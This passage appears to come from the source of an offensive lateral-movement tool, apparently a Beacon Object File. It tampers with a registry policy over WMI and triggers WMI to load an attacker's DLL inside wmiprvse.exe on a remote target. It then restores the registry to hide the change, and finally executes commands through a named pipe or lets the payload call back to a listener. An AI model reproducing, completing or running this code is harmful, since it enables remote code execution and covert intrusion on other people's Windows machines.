        restore_finalpolicy(pSvcDefault, guid, &backup);
        pSvcDefault->Release();
        OLE32$CoUninitialize();
        return;
    }

    if (!trigger_wmi(pSvcCimv2)) {
        TMB_WARN("WMI trigger failed -- restoring");
        restore_finalpolicy(pSvcDefault, guid, &backup);
        pSvcCimv2->Release();
        pSvcDefault->Release();
        OLE32$CoUninitialize();
        return;
    }
    pSvcCimv2->Release();

    /* ---- Phase 4: Restore registry ---- */
    KERNEL32$Sleep(2000);

    if (!no_cleanup) {
        restore_finalpolicy(pSvcDefault, guid, &backup);
    }
    pSvcDefault->Release();

    /* ---- Phase 5: Exec mode -- connect to pipe ---- */
    if (mode == 1) {
        if (!pipe_exec(target, dll_name, command)) {
            TMB_ERR("Pipe execution failed");
        }
    } else {
        TMB_OK("Jump complete. DLL loaded in wmiprvse.exe on %s", target);
        TMB_INFO("Payload should call back via its configured listener.");
    }

    OLE32$CoUninitialize();

    if (mode == 1) {
        TMB_OK("Execution complete on %s", target);
    }
}
